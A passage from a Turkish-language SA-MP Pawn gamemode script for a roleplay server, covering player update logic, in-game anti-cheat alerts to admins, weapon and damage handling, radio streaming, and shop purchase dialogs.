		else if(Karakter[playerid][unlu] == 1) SetPlayerColor(playerid, COLOR_UNLU);
		else if(aDuty2[playerid] == 1) SetPlayerColor(playerid, 0x800000FF);
		else SetPlayerColor(playerid, COLOR_WHITE);
	}
    Pupdate[playerid]++;
	if(Pupdate[playerid] == 3)
	{
		if(Pwep[playerid] > 0)
		{
			SetPlayerArmedWeapon(playerid, Pwep[playerid]);
			new veh =  GetPlayerVehicleID(playerid);
			new seat = GetPlayerVehicleSeat(playerid);
			new Float:X, Float:Y, Float:Z, Float:rX, Float:rY, Float:rZ;
			GetVehicleVelocity(veh, Float:rX, Float:rY, Float:rZ);
			GetPlayerPos(playerid, Float:X, Float:Y, Float:Z);
			SetPlayerPos(playerid, Float:X, Float:Y, Float:Z);
			PutPlayerInVehicle(playerid, veh, seat);
			SetVehicleVelocity(veh, Float:rX, Float:rY, Float:rZ);
			SetPVarInt(playerid, "PwepTimer", SetTimerEx("PwepSifirla", 3000, false, "u", playerid));
		}
		Pupdate[playerid] = 0;
	}
    /*static __string[128];
    new Float:degisikbihp, Float:degisikbiarm;
	GetPlayerHealth(playerid, degisikbihp);
	GetPlayerArmour(playerid, degisikbiarm);
    if(degisikbiarm > 0)
	{
		format(__string, sizeof(__string), "HP: %d\n{ECECEC}ARM: %d", floatround(degisikbihp), floatround(degisikbiarm));
	}
	else
	{
	    format(__string, sizeof(__string), "HP: %d", floatround(degisikbihp));
	}
	if(degisikbiarm < 0 || degisikbiarm > 100)format(__string, sizeof(__string), "HP: ?", floatround(degisikbihp));
	if(degisikbiarm < 0 || degisikbiarm > 100)format(__string, sizeof(__string), "ARM: ?", floatround(degisikbiarm));
	UpdateDynamic3DTextLabelText(tanismaHP[playerid], GetPlayerHPColor(degisikbihp), __string);*/
	//if(Debug) printf("OnPlayerUpdate(%d)",playerid);
	if(GetPlayerWeapon(playerid) != GetPVarInt(playerid, "SirtSilah") && !IsPlayerAttachedObjectSlotUsed(playerid, gunindex[playerid]) && Birlik[Karakter[playerid][birlik]][ftip] != LSPD)
	{
	   	foreach(new i : Guns) {
			if(OyuncuSilah[i][oyuncuid] == Karakter[playerid][sqlid] && OyuncuSilah[i][durum] == 1) {
                if(OyuncuSilah[i][silahid] == 34) { SetPVarInt(playerid, "SirtSilah", 34); gunindex[playerid] = 7; SetPlayerAttachedObject(playerid,gunindex[playerid],358,1,-0.130999,-0.123999,0.093000,-7.999999,30.400001,0.000000,0.895999,1.000000,1.000000); break; }
                else if(OyuncuSilah[i][silahid] == 33) { SetPVarInt(playerid, "SirtSilah", 33); gunindex[playerid] = 7; SetPlayerAttachedObject(playerid,gunindex[playerid],357,1,-0.082999,-0.151000,0.100999,8.699999,38.099994,0.000000,0.810999,1.000000,1.000000); break; }
                else if(OyuncuSilah[i][silahid] == 31) { SetPVarInt(playerid, "SirtSilah", 31); gunindex[playerid] = 7; SetPlayerAttachedObject(playerid,gunindex[playerid],356,1,-0.074999,-0.136999,0.000000,-1.700000,26.199998,0.000000,1.000000,1.000000,1.000000); break; }
                else if(OyuncuSilah[i][silahid] == 30) { SetPVarInt(playerid, "SirtSilah", 30); gunindex[playerid] = 7; SetPlayerAttachedObject(playerid,gunindex[playerid],355,1,-0.047999,-0.154999,0.021999,0.000000,42.299995,0.000000,0.719999,1.000000,1.000000); break; }
                //else if(OyuncuSilah[i][silahid] == 32) { SetPVarInt(playerid, "SirtSilah", 32); gunindex[playerid] = 7; SetPlayerAttachedObject(playerid,gunindex[playerid],372,1,0.000000,-0.158999,0.125999,0.800000,61.299991,1.799998,1.000000,1.000000,1.000000); break; }
                else if(OyuncuSilah[i][silahid] == 29) { SetPVarInt(playerid, "SirtSilah", 29); gunindex[playerid] = 7; SetPlayerAttachedObject(playerid,gunindex[playerid],353,1,-0.063000,-0.158999,-0.139999,-3.499998,-6.600002,0.000000,1.000000,1.000000,1.000000); break; }
                //else if(OyuncuSilah[i][silahid] == 28) { SetPVarInt(playerid, "SirtSilah", 28); gunindex[playerid] = 7; SetPlayerAttachedObject(playerid,gunindex[playerid],352,1,0.159999,-0.157999,0.075000,0.999999,74.500015,7.499999,1.000000,1.000000,1.000000); break; }
                else if(OyuncuSilah[i][silahid] == 27) { SetPVarInt(playerid, "SirtSilah", 27); gunindex[playerid] = 7; SetPlayerAttachedObject(playerid,gunindex[playerid],351,1,-0.222000,-0.172000,-0.134000,0.000000,-8.099996,6.599997,1.000000,1.000000,1.000000); break; }
                else if(OyuncuSilah[i][silahid] == 26) { SetPVarInt(playerid, "SirtSilah", 26); gunindex[playerid] = 7; SetPlayerAttachedObject(playerid,gunindex[playerid],350,1,-0.162000,-0.161000,0.118000,-4.199999,37.599994,3.199998,1.000000,1.000000,1.000000); break; }
                else if(OyuncuSilah[i][silahid] == 25) { SetPVarInt(playerid, "SirtSilah", 25); gunindex[playerid] = 7; SetPlayerAttachedObject(playerid,gunindex[playerid],349,1,-0.095999,-0.185999,-0.116999,-1.299998,-15.499997,13.000002,0.876999,0.994000,0.928999); break; }
                else if(OyuncuSilah[i][silahid] == 3) { SetPVarInt(playerid, "SirtSilah", 3); gunindex[playerid] = 7; SetPlayerAttachedObject(playerid,gunindex[playerid],334,7,0.000000,0.106000,-0.055999,-81.499992,84.400001,0.000000,1.000000,1.000000,0.879999); break; }
			}
	   	}
	}
	if(GetPlayerWeapon(playerid) == GetPVarInt(playerid, "SirtSilah") && IsPlayerAttachedObjectSlotUsed(playerid, gunindex[playerid]) && Birlik[Karakter[playerid][birlik]][ftip] != LSPD)
	{
     	SetPVarInt(playerid, "SirtSilah", -1);
	    RemovePlayerAttachedObject(playerid, gunindex[playerid]);
		gunindex[playerid] = -1;
	}
	new iCurWeap = GetPlayerWeapon(playerid);
    if(iCurWeap != GetPVarInt(playerid, "iCurrentWeapon"))
    {
        OnPlayerChangeWeapon(playerid, GetPVarInt(playerid, "iCurrentWeapon"), iCurWeap);
        SetPVarInt(playerid, "iCurrentWeapon", iCurWeap);
    }
    if(IsPlayerInAnyVehicle(playerid) && Girdi[playerid])
    {
    	if(GetPlayerVehicleID(playerid) != GetPVarInt(playerid,"ac_car_id") && Karakter[playerid][adminlevel] < 1)
        {
            SetPVarInt(playerid,"ac_car_id",-1);
            new Float:x,Float:y,Float:z;
            GetPlayerPos(playerid,x,y,z);
            SetPlayerPos(playerid,x,y,z+1);
            new mstring[128];
            format(mstring, sizeof(mstring), "%s Hile yapýyor olabilir!",OyuncuAdiniBul(playerid));
            AdminGonder(mstring);
        }
        
        static
	    Float:fHealth,
	    engine,lights,alarm,doors,bonnet,boot,objective;

		if (IsValidVehicle(GetPlayerVehicleID(playerid)) && GetVehicleHealth(GetPlayerVehicleID(playerid), fHealth) && fHealth < 300.0) {
		    SetVehicleHealth(GetPlayerVehicleID(playerid), 300.0);
			GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
			SetVehicleParamsEx(GetPlayerVehicleID(playerid),VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
		}
    }
	if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
	    new Float:vHealth,vID=GetPlayerVehicleID(playerid);
	    GetVehicleHealth(vID, vHealth);
	    if(vHealth <= 400 && AMotorDurdur[vID])
		{
			MotoruKapat(vID);
			AMotorDurdur[vID] = false;
			Ipucu(playerid, "Motor fazla hasar aldýðý için durmuþtur.");
		}
	}
	if( GetPlayerAnimationIndex( playerid ) )
    {
        new
			animlib[ 32 ],
      		animname[ 32 ]
	  	;
        GetAnimationName( GetPlayerAnimationIndex( playerid ), animlib, 32, animname, 32 );
        if( !strcmp( animlib, "KNIFE", true ) && !strcmp( animname, "KILL_PARTIAL", true ) )
        {
            ClearAnimations( playerid );
		}
    }
	if(Karakter[playerid][ajail] > 0) DONDUR(playerid);
	AFK[playerid] = false;
   	new Float: health, Float: armour;
    GetPlayerHealth(playerid, health);
    GetPlayerArmour(playerid, armour);
    new HP = floatround(health +armour, floatround_floor);
    if (GetPlayerTeam(playerid) == 255)
    {
    	new anim_id = GetPlayerAnimationIndex(playerid);
        if (anim_id != GetPVarInt(playerid, "last_anim"))
        {
        	if (1071 <= anim_id <= 1086 || 1170 <= anim_id <= 1179 || 1240 <= anim_id <= 1243)
            {
            	if (HP == GetPVarInt(playerid, "LastHP1") && HP == GetPVarInt(playerid, "LastHP"))
                {
                	new animlib[32], animname[32];
                    GetAnimationName(anim_id, animlib, sizeof(animlib), animname, sizeof(animname));
                    new name[MAX_PLAYER_NAME];
                    GetPlayerName(playerid, name, sizeof(name));
                    new string[128];
                    format(string, sizeof(string), "%s - GodMode", name);
                    AdminGonder(string);
				} else {
    				SetPVarInt(playerid, "LastHP1", HP);
        		}
          	}
            SetPVarInt(playerid, "last_anim", anim_id);
        }
    }
    if (HP != GetPVarInt(playerid, "LastHP"))
    {
    	SetPVarInt(playerid, "LastHP", HP);
	}

    PlayerTextDrawSetString(playerid, CanTD[playerid], CanEx(playerid));
	PlayerTextDrawSetString(playerid, ZirhTD[playerid], ZirhEx(playerid));
	if(TaserDurum[playerid] && GetPlayerWeapon(playerid) == 23 && GetPlayerAmmo(playerid) == 1)
	{
	    PlayReloadAnimation(playerid, 23);
	    SetPlayerAmmo(playerid, 23, 2);
	}
	if(GetPVarInt(playerid, "BeanBag") == 1 && GetPlayerWeapon(playerid) == 25 && GetPlayerAmmo(playerid) == 1)
	{
	    PlayReloadAnimation(playerid, 25);
	    SetPlayerAmmo(playerid, 25, 5);
	}
    if(pFiredSawnoff[playerid] && GetPlayerWeapon(playerid) != WEAPON_SAWEDOFF)
	{
		pFiredSawnoff[playerid] = false;
		pAttemptingTwoShot[playerid] = true;
	}
 	if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][isbasi] == 1)
	{
	    foreach(new i : Player)
	    {
	        new Float:DX, Float:DY, Float:DZ;
	        GetPlayerPos(playerid, DX, DY, DZ);
		    if(Birlik[Karakter[i][birlik]][ftip] == LSPD && Karakter[i][isbasi] == 1)
		    {
			    if(PDDestek[playerid] == 1 || PDHDestek[playerid] == 1 || PDFDestek[playerid] == 1)
				{
					SetPlayerMapIcon(i, playerid, DX, DY, DZ, 0, COLOR_YELLOW, MAPICON_GLOBAL);
				}
				else
				{
					SetPlayerMapIcon(i, playerid, DX, DY, DZ, 0, 0x8D8DFFFF, MAPICON_GLOBAL);
				}
   			}
			else
			{
   				RemovePlayerMapIcon(i, playerid);
			}
		}
	}
	if(pAttemptingTwoShot[playerid])
	{
		new anim_library[32], anim_name[32];
		GetAnimationName(GetPlayerAnimationIndex(playerid), anim_library, 32, anim_name, 32);

		if(!strcmp(anim_name, "sawnoff_reload", true))
		{
			pLastBulletAmount[playerid] = GetPlayerAmmo(playerid);
			pAttemptingTwoShot[playerid] = false;
		}
	}
	new Float:playerPos[3];
	GetPlayerPos(playerid, playerPos[0], playerPos[1], playerPos[2]);
	if(playerPos[0] >= 99999.0 || playerPos[1] >= 99999.0 || playerPos[2] >= 99999.0 || playerPos[0] <= -99999.0 || playerPos[1] <= -99999.0 || playerPos[2] <= -99999.0 )
	{
	    new mstring[128];
	    format(mstring,sizeof(mstring), "%s - OyuncuMapinDisinaCiktiMK",OyuncuAdiniBul(playerid));
	    AdminGonder(mstring);
	  	SendClientMessage(playerid, COLOR_GREY, "Warning: Excessive X, Y, Z has been breached thus last location set.");
		SetPlayerPos(playerid, 1529.6,-1691.2,13.3);
		return 0;
	}
	if(SilahKullaniyor[playerid] > 0 && Pwep[playerid] == 0 && GetPVarInt(playerid, "PwepTimer") == 0 && Birlik[Karakter[playerid][birlik]][ftip] != LSPA && Birlik[Karakter[playerid][birlik]][ftip] != SANTV && Birlik[Karakter[playerid][birlik]][ftip] != LSPD && Birlik[Karakter[playerid][birlik]][ftip] != FBI && !GetPVarInt(playerid, "InAirsoft"))
	{
		for(new s = 0; s < sizeof(mermiliSilahlar); s++)
		{
	 		if(GetPlayerWeapon(playerid) == mermiliSilahlar[s] && GetPlayerWeapon(playerid) != 23)
			{
			    if(GetPlayerAmmo(playerid) == 0 && GetPlayerWeapon(playerid) != 0 )
			    {
			        OyuncuSilah[SilahKullaniyor[playerid]][mermi] = 0;
					OyuncuSilahKaydetEx(SilahKullaniyor[playerid]);
					RemovePlayerWeapon(playerid, GetPlayerWeapon(playerid));
					SilahKullaniyor[playerid] = 0;
					//print("+");
			    }
	  			//new GunID = GetPlayerWeapon(playerid);
				new ammo = GetPlayerAmmo(playerid);
				if(OyuncuSilah[SilahKullaniyor[playerid]][mermi] < ammo)
				{
					new string[128];
	                ResetPlayerWeapons(playerid);
					format(string, sizeof(string), "[ANTÝ-HÝLE] %s(%d) silahýnýn mermisini arttýrmaya çalýþtý ve silahý silindi.", OyuncuAdiniBul(playerid), playerid);
					EkibeYollaDuty(COLOR_ORANGE,  string, 1);
				}
				else OyuncuSilah[SilahKullaniyor[playerid]][mermi] = ammo,OyuncuSilahKaydetEx(SilahKullaniyor[playerid]);
			}
		}
	}
	if(Birlik[Karakter[playerid][birlik]][ftip] != LSPD && Birlik[Karakter[playerid][birlik]][ftip] != LSPA && Birlik[Karakter[playerid][birlik]][ftip] != FBI && Karakter[playerid][adminlevel] < 1 && Birlik[Karakter[playerid][birlik]][ftip] != LSFD && Birlik[Karakter[playerid][birlik]][ftip] != SANTV && !GetPVarInt(playerid, "InAirsoft") && GetPlayerAmmo(playerid) != 0 && GetPlayerWeapon(playerid) != 46 && GetPlayerWeapon(playerid) != 23 && GetPlayerWeapon(playerid) > 0)
	{
	    silah_kontrol[playerid]=false;
	    foreach(new i : Guns)
		{
		    if(OyuncuSilah[i][silahid] == GetPlayerWeapon(playerid))
		    {
		        silah_kontrol[playerid] = true;
		        break;
		    }
		}
		if(!silah_kontrol[playerid]) {
			new mstring[128];
			format(mstring, sizeof(mstring), "%s silah hilesi yaptý ve oyundan atýldý.",OyuncuAdiniBul(playerid));
			AdminGonder(mstring);
			Kick(playerid);
		}
		new antigun=0;
  		if(OyuncuSilah[SilahKullaniyor[playerid]][oyuncuid] != Karakter[playerid][sqlid]) antigun++;
  		if(antigun != 0 && !GetPVarInt(playerid, "InAirsoft"))
  		{
  		    new string[128];
    		if(GetPVarInt(playerid, "aww"))
				return 0;
    		if(Birlik[Karakter[playerid][birlik]][ftip] == LSPA || Birlik[Karakter[playerid][birlik]][ftip] == LSPD || Birlik[Karakter[playerid][birlik]][ftip] == FBI || Birlik[Karakter[playerid][birlik]][ftip] == LSFD || Karakter[playerid][adminlevel] >= 1 || GetPVarInt(playerid, "InAirsoft"))
				return 0;
    		format(string, sizeof(string), "%s silah hilesi yapmaya çalýþýyor olabilir, kontrol edin.", OyuncuAdiniBul(playerid));
			AdminGonder(string);
			ResetPlayerWeapons(playerid);
			antigun = 0;
			format(string, sizeof(string), "[ANTI-HILE]Silah hilesi yapmaya çalýþtý. Silah: %d mermi: %d", GetPlayerWeapon(playerid), GetPlayerAmmo(playerid));
			Log(playerid, string);
		}
	}
    if(!Radyorenniem[playerid])
    {
        for(new i=0;i<MAX_PLAYERS;i++)
        {
            if(IsPlayerConnected(i))
            {
                if(rennieRadyo[i])
                {
                    if(IsPlayerInRangeOfPoint(playerid, 30, rennieradyopos[i][0], rennieradyopos[i][1], rennieradyopos[i][2]) && GetPlayerVirtualWorld(playerid) == RadyoVirtual[i] && !isnull(rennieRadyoURL[i]))
                    {
                        PlayAudioStreamForPlayer(playerid, rennieRadyoURL[i], rennieradyopos[i][0], rennieradyopos[i][1], rennieradyopos[i][2], 30, 1);
                        RadyoOyuncu[playerid] = i;
                        Radyorenniem[playerid] = 1;
                    }
                }
            }
        }
    }
    else
    {
        new i = RadyoOyuncu[playerid];
        if(!IsPlayerInRangeOfPoint(playerid, 30, rennieradyopos[i][0], rennieradyopos[i][1], rennieradyopos[i][2]))
        {
            Radyorenniem[playerid] = 0;
            RadyoOyuncu[playerid] = -1;
            StopAudioStreamForPlayer(playerid);
        }
    }
	if(KutuTasiyor[playerid] != 0)
	{
	    if(!GetPlayerAnimationIndex(playerid))
	        ApplyAnimation(playerid,"CARRY","crry_prtial",4.1, 1, 1, 1, 1, 1, 1);
	    new animlib[32];
        new animname[32];
	    GetAnimationName(GetPlayerAnimationIndex(playerid),animlib,32,animname,32);
	    if(!Buysa("CARRY",animlib) || !Buysa("crry_prtial",animname))
            ApplyAnimation(playerid,"CARRY","crry_prtial",4.1, 1, 1, 1, 1, 1, 1);
	}
	if(GetPVarInt(playerid, "Yarali") > 0)
	{
	    if(!GetPlayerAnimationIndex(playerid))
	        DONDUR(playerid),
         	ApplyAnimationEx(playerid,"CRACK","crckidle2",4.1,0,1,1,1,1);
	    new animlib[32];
        new animname[32];
	    GetAnimationName(GetPlayerAnimationIndex(playerid),animlib,32,animname,32);
	    if(!Buysa("CRACK",animlib) || !Buysa("crckidle2",animname))
	        DONDUR(playerid),
            ApplyAnimationEx(playerid,"CRACK","crckidle2",4.1,0,1,1,1,1);
	}
	return 1;
}

public OnPlayerStreamIn(playerid, forplayerid)
{
	if(Debug) printf("OnPlayerStreamIn(%d, %d)",playerid, forplayerid);
	SetPlayerFightingStyle(playerid, GetPlayerFightingStyle(playerid));
    SetPlayerFightingStyle(forplayerid, GetPlayerFightingStyle(forplayerid));
   	if(Maske[playerid] == true || Maske2[playerid] == true) ShowPlayerNameTagForPlayer(forplayerid, playerid, false);
	return 1;
}

public OnPlayerStreamOut(playerid, forplayerid)
{
    if(Debug) printf("OnPlayerStreamOut(%d, %d)",playerid, forplayerid);
    if(Maske[playerid] == false || Maske2[playerid] == false) ShowPlayerNameTagForPlayer(forplayerid, playerid, true);
	return 1;
}

public OnVehicleStreamIn(vehicleid, forplayerid)
{
    if(Debug) printf("OnVehicleStreamIn(%d, %d)",vehicleid, forplayerid);
	return 1;
}

public OnVehicleStreamOut(vehicleid, forplayerid)
{
    if(Debug) printf("OnVehicleStreamOut(%d, %d)",vehicleid, forplayerid);
	return 1;
}

public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
{
	if(Debug) printf("OnPlayerClickMap(%d, %f, %f, %f)",playerid, fX, fY, fZ);
	new Float:pPos[3];
	GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
   	if(GetDistanceBetweenPoints(fX, fY, fZ, pPos[0],pPos[1], pPos[2]) == 0 && Karakter[playerid][adminlevel] < 1)
   	{
   	    new mstring[128];
   	    format(mstring, sizeof(mstring), "%s - Iþýnlanma Hilesi");
   	    AdminGonder(mstring);
   	}
    return 1;
}

public OnPlayerGiveDamage(playerid, damagedid, Float: amount, weaponid, bodypart)
{
	if(Debug) printf("OnPlayerGiveDamage(%d, %d, %f, %d, %d)",playerid, damagedid, amount, weaponid, bodypart);
	if(!MermisizSilah(weaponid) && TaserDurum[playerid] == 0 && GetPVarInt(playerid, "BeanBag") == 0)
	{
	    new Float:pHealth,Float:pArmour;
	    GetPlayerHealth(damagedid, pHealth);
	    GetPlayerArmour(damagedid, pArmour);
	    HasarVer(damagedid, 2, weaponid, pHealth, pArmour);
		//SetPlayerDrunkLevel(damagedid, 8000);
        //clearshock[playerid] = SetTimerEx("ClearShock", 30000, false, "i", damagedid);
	}
    return 1;
}

public OnPlayerTakeDamage(playerid, issuerid, Float: amount, weaponid, bodypart)
{
    if(Debug) printf("OnPlayerTakeDamage(%d, %d, %f, %d, %d)",playerid, issuerid, amount, weaponid, bodypart);
	if(!GetPVarInt(playerid, "InAirsoft")) {
		if(weaponid != 0 && weaponid != 5)
		{
			switch(weaponid)
			{
				case 4,8..9,16,22,24..36: SetPlayerBleeding(playerid);
			}
		}
		if((0 <= weaponid <= 46) || weaponid == 54)
		{
			if(BODY_PART_TORSO <= bodypart <= BODY_PART_HEAD) Damage1[playerid][(bodypart - 3)][weaponid]++;
		}
		if(weaponid == 22 || weaponid == 23 || weaponid == 24 || weaponid == 25 || weaponid == 26 || weaponid == 27 || weaponid == 28 || weaponid == 29 || weaponid == 30 || weaponid == 31 ||
		weaponid == 33 || weaponid == 34 || weaponid == 35 || weaponid == 36 || weaponid == 38)
		{
			new Float:x, Float:y, Float:z;
			GetPlayerPos(playerid, x, y, z);
			if(!IsPlayerAimingAt(issuerid, x, y, z, 1.1))
			{
				new mstring[128];
				format(mstring, sizeof(mstring), "%s(%d) - Aim Hack",OyuncuAdiniBul(playerid),playerid);
				AdminGonder(mstring);
			}
		}
		new string[256];
		new Float:HP;
		GetPlayerHealth(playerid, HP);
		if(weaponid == 0 && IsPlayerConnected(issuerid) && IsPlayerConnected(playerid))
		{
			new id = issuerid;
			switch(KarakterOzellik[id][Guc])
			{
				case 0: SetPlayerHealth(playerid, HP-1);
				case 1: SetPlayerHealth(playerid, HP-2);
				case 2: SetPlayerHealth(playerid, HP-2);
				case 3: SetPlayerHealth(playerid, HP-2);
				case 4: SetPlayerHealth(playerid, HP-2);
				case 5: SetPlayerHealth(playerid, HP-3);
				case 6: SetPlayerHealth(playerid, HP-3);
				case 7: SetPlayerHealth(playerid, HP-3);
				case 8: SetPlayerHealth(playerid, HP-3);
				case 9: SetPlayerHealth(playerid, HP-4);
				case 10: SetPlayerHealth(playerid, HP-4);
				case 11: SetPlayerHealth(playerid, HP-4);
				case 12: SetPlayerHealth(playerid, HP-5);
				case 13: SetPlayerHealth(playerid, HP-5);
				case 14: SetPlayerHealth(playerid, HP-5);
				case 15: SetPlayerHealth(playerid, HP-6);
				case 16: SetPlayerHealth(playerid, HP-6);
				case 17: SetPlayerHealth(playerid, HP-7);
				case 18: SetPlayerHealth(playerid, HP-7);
				case 19: SetPlayerHealth(playerid, HP-8);
				case 20: SetPlayerHealth(playerid, HP-9);
			}
		}
		if(issuerid != INVALID_PLAYER_ID)
		{
			if(TaserDurum[issuerid] == 1 && weaponid == 23)
			{
				if(ProxDetectorS(15.0, issuerid, playerid))
				{
					ClearAnimations(playerid, 1);
					if(IsPlayerConnected(playerid))
					{
						format(string, sizeof(string), "* %s tarafýndan þok uygulandý. 20 saniye hareketsizsiniz.", OyuncuAdiniBul(issuerid));
						Bilgi(playerid, string);
						format(string, sizeof(string), "* %s adlý kiþiye þok uyguladýnýz. 20 saniye hareketsiz.", OyuncuAdiniBul(playerid));
						Bilgi(issuerid, string);
						OnPlayerCommandPerformed(issuerid,"/me taser silahýnýn tetiðini çeker.",0);
						format(string, sizeof(string), "/do Taser silahýnýn ucundaki kartuþtan fýrlayan iðne %s'a batmýþtýr.", OyuncuAdiniBul(playerid));
						OnPlayerCommandPerformed(issuerid,string,0);
						ApplyAnimationEx(playerid,"PED","FLOOR_hit",4.1,0,1,1,1,1);
						SetPlayerDrunkLevel(playerid, 3000);
						TogglePlayerControllable(playerid, 0);
						SetTimerEx("TimerFall",20000,false,"d",playerid);
						new Float:_hp;
						GetPlayerHealth(playerid, _hp);
						SetPlayerHealth(playerid, _hp);
						if(IsPlayerBleeding(playerid)) StopPlayerBleeding(playerid);
						return 1;
					}
				}
			}
			if(GetPVarInt(issuerid, "BeanBag") == 1 && weaponid == 25)
			{
				if(ProxDetectorS(30.0, issuerid, playerid))
				{
					ClearAnimations(playerid, 1);
					if(IsPlayerConnected(playerid))
					{
						format(string, sizeof(string), "* %s tarafýndan beanbag uygulandý. 20 saniye hareketsizsiniz.", OyuncuAdiniBul(issuerid));
						Bilgi(playerid, string);
						format(string, sizeof(string), "* %s adlý kiþiye beanbag uyguladýnýz. 20 saniye hareketsiz.", OyuncuAdiniBul(playerid));
						Bilgi(issuerid, string);
						ApplyAnimationEx(playerid,"PED","FLOOR_hit",4.1,0,1,1,1,1);
						SetPlayerDrunkLevel(playerid, 3000);
						TogglePlayerControllable(playerid, 0);
						SetTimerEx("TimerFall",20000,false,"d",playerid);
						new Float:_hp;
						GetPlayerHealth(playerid, _hp);
						SetPlayerHealth(playerid, _hp);
						if(IsPlayerBleeding(playerid)) StopPlayerBleeding(playerid);
						return 1;
					}
				}
			}
		}
		if(weaponid != 0 && weaponid != 23 && weaponid != 41 && issuerid != INVALID_PLAYER_ID)
		{
			new say;
			for(new s; s<24; s++)
			{
				if(weaponid == mermiliSilahlar[s]) say++;
			}
			if(say != 0)
			{
				if(AntiAmmoHackoldammo[issuerid] != 0)
				{
					if(GetPlayerAmmo(issuerid) == AntiAmmoHackoldammo[issuerid])
					{
						for(new a; a<MAX_PLAYERS; a++)
						{
							if(Karakter[a][adminlevel] >= 1 && aDuty[a])
							{
								format(string, sizeof(string), "[ANTÝ-HÝLE] %s, sýnýrsýz mermi hilesi yapýyor olabilir, kontrol edin.", OyuncuAdiniBul(issuerid));
								SendClientMessage(a, COLOR_ORANGE, string);
							}
						}
						Log(playerid, "[ANTI-HILE]Sýnýrsýz mermi hilesi yapmayý denedi.");
					}
				}
			}
			AntiAmmoHackoldammo[issuerid] = GetPlayerAmmo(issuerid);
		}
	}
	return 1;
}
public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
	if(Debug) printf("OnDialogResponse(%d, %d, %d, %d, %s)",playerid, dialogid, response, listitem, inputtext);
	for(new i = 0, len = strlen(inputtext); i != len; i ++)
	{
		if(inputtext[i] != '%') continue;
		inputtext[i] = '#';
	}
	if(dialogid == 3060)
	{
	    if(!response)return 1;
	    BarikatSil(GetPVarInt(playerid, "DuzenleBarikat"));
	    Streamer_Update(playerid);
	    SetPVarInt(playerid, "DuzenleBarikat", 0);
		SetPVarInt(playerid, "BarikatDuzenliyorum", 0);
		Bilgi(playerid, "Barikat silindi.");
		return 1;
	}
	if(dialogid == 3030)
	{
	    if(response)
	    {
		    new giveplayerid = MalSatYTeklif[playerid];
			new miktar = MalSatYMiktar[playerid];
			new fiyat = MalSatYFiyat[playerid];
	        GivePlayerCash(playerid, -fiyat);
	        GivePlayerCash(giveplayerid, fiyat);
	        Bilgi(playerid, "Teklifi baþarýyla onayladýnýz. Üzerinizdeki ürünleri görüntüleyebilmek için ''/urunlerim'' yazmanýz yeterlidir.");
	        Bilgi(giveplayerid, "Karþý taraf teklifinizi onayladý.");
	        Karakter[playerid][nyiyeceq] += miktar;
	        Karakter[giveplayerid][nyiyeceq] -= miktar;
	    }
	}
	if(dialogid == 3024)
	{
	    if(response)
		{
		    if(strval(inputtext) > 0 && strval(inputtext) < 101)
		    {
				if(GetPlayerCash(playerid) <= Veriler[yiyecekfiyat]*strval(inputtext))
				{
				    Hata(playerid, "Yeterli paranýz yok.");
				    return 1;
				}
				new string[128];
				format(string, sizeof(string), "Toplam %d$ ödediniz. %d adet satýn aldýnýz.", strval(inputtext)*Veriler[yiyecekfiyat]);
				Bilgi(playerid, string);
				Ipucu(playerid, "Satýn aldýðýnýz malý bir dükkana satabilmek için ''/malsat'' komutunu kullanmalýsýnýz.");
				Ipucu(playerid, "Eðer oyundan çýkarsanýz bu iþlem iptal edilir, üzerinizdeki mallar silinir ve geri iade yapýlmaz.");
				GivePlayerCash(playerid, -Veriler[yiyecekfiyat]*strval(inputtext));
				Karakter[playerid][nyiyeceq] += strval(inputtext);
		    }
		    else
		    {
		        Hata(playerid, "Geçersiz bir miktar girdiniz.");
		    }
		}
	}
	if(dialogid == 3022)
	{
		if(response)
		{
		    if(strval(inputtext) > 0 && strval(inputtext) < 101)
		    {
				if(GetPlayerCash(playerid) <= Veriler[ickifiyat]*strval(inputtext))
				{
					Hata(playerid, "Yeterli paranýz yok.");
				 	return 1;
				}
				new string[128];
				format(string, sizeof(string), "Toplam %d$ ödediniz. %d adet satýn aldýnýz.", strval(inputtext)*Veriler[ickifiyat]);
				Bilgi(playerid, string);
				Ipucu(playerid, "Satýn aldýðýnýz malý bir dükkana satabilmek için ''/malsat'' komutunu kullanmalýsýnýz.");
				Ipucu(playerid, "Eðer oyundan çýkarsanýz bu iþlem iptal edilir, üzerinizdeki mallar silinir ve geri iade yapýlmaz.");
				GivePlayerCash(playerid, -Veriler[ickifiyat]*strval(inputtext));
				Karakter[playerid][nicqi] += strval(inputtext);

			}
			else
			{
			    Hata(playerid, "Geçersiz bir miktar girdiniz.");
			}
		}
	}
	if(dialogid == 3023)
	{
	    if(response)
	    {
	        // 1 dondurulmuþ yiyecekler 2 sýcak yiyecekler 3 dünya mutfaðý
	        if(listitem == 0)
	        {
	            ShowPlayerDialog(playerid, 3024, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Nakliye Sistemi", "Dondurulmuþ yiyecek satýn almak istediðinize emin misiniz?\nKaç adet satýn almak istiyorsunuz?\nBu iþlemin geri dönüþü olmayacaktýr.", "Satýn Al", "Kapat");
	        }
	        if(listitem == 1)
	        {
	            ShowPlayerDialog(playerid, 3024, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Nakliye Sistemi", "Sýcak yiyecek satýn almak istediðinize emin misiniz?\nKaç adet satýn almak istiyorsunuz?\nBu iþlemin geri dönüþü olmayacaktýr.", "Satýn Al", "Kapat");
	        }
	        if(listitem == 2)
	        {
	            ShowPlayerDialog(playerid, 3024, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Nakliye Sistemi", "Dünya mutfaðý yemekleri satýn almak istediðinize emin misiniz?\nKaç adet satýn almak istiyorsunuz?\nBu iþlemin geri dönüþü olmayacaktýr.", "Satýn Al", "Kapat");
	        }
		}
	}
	if(dialogid == 3021)
	{
	    if(response)
	    {// 1 bira 2 þarap 3 viski 4 sprunk
	        if(listitem == 0)
	        {
				ShowPlayerDialog(playerid, 3022, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Nakliye Sistemi", "Bira satýn almak istediðinize emin misiniz?\nKaç adet satýn almak istiyorsunuz?\nBu iþlemin geri dönüþü olmayacaktýr.", "Satýn Al", "Kapat");
	        }
